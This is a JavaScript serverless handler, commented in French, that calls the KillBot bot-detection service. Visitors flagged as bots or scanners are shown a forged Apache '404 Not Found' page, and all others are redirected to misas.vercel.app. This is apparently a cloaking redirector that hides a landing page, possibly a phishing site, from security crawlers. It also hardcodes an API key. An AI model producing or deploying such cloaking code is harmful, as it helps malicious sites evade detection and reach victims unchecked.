import KillBot from 'killbot.to';

// Utilisez une variable d'environnement pour l'API key en production
const apiKey = process.env.KILLBOT_API_KEY || '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

export default async function handler(req, res) {
  try {
    // Extraire l'IP du client depuis les en-têtes de Render
    // Render utilise X-Forwarded-For ou remoteAddress
    const clientIP = 
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
      req.headers['x-real-ip'] || 
      req.connection.remoteAddress || 
      '127.0.0.1';

    console.log("Client IP détectée:", clientIP);
    
    // Créer un objet modifié pour KillBot avec l'IP explicitement définie
    const modifiedReq = {
      ...req,
      ip: clientIP,
      // Ajouter aussi ces propriétés pour plus de compatibilité
      connection: {
        ...req.connection,
        remoteAddress: clientIP
      },
      headers: {
        ...req.headers,
        'x-forwarded-for': clientIP
      }
    };

    // Vérification du bot via KillBot avec l'objet modifié
    const result = await killBot.checkReq(modifiedReq);
    
    if (result.block) {
      const requestedPageWithoutQueryString = req.path || '/';
      const serverName = req.hostname || 'example.com';
      
      const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL ${requestedPageWithoutQueryString} was not found on this server.</p>
        <hr>
        <address>Apache/2.4.57 (Debian) Server at ${serverName} Port 80</address>
        </body></html>`;
      
      return res.status(404).send(fake404);
    } else {
      res.writeHead(302, { Location: 'https://misas.vercel.app' });
      return res.end();
    }
  } catch (err) {
    console.error('KillBot error:', err);
    // Ajout d'informations de débogage pour comprendre l'erreur
    console.error('Request IP info:', {
      ip: req.ip,
      remoteAddress: req.connection?.remoteAddress,
      xForwardedFor: req.headers['x-forwarded-for'],
      xRealIp: req.headers['x-real-ip']
    });
    
    // En cas d'erreur avec KillBot, rediriger quand même pour éviter de bloquer l'utilisateur
    res.writeHead(302, { Location: 'https://misas.vercel.app' });
    return res.end();
  }
}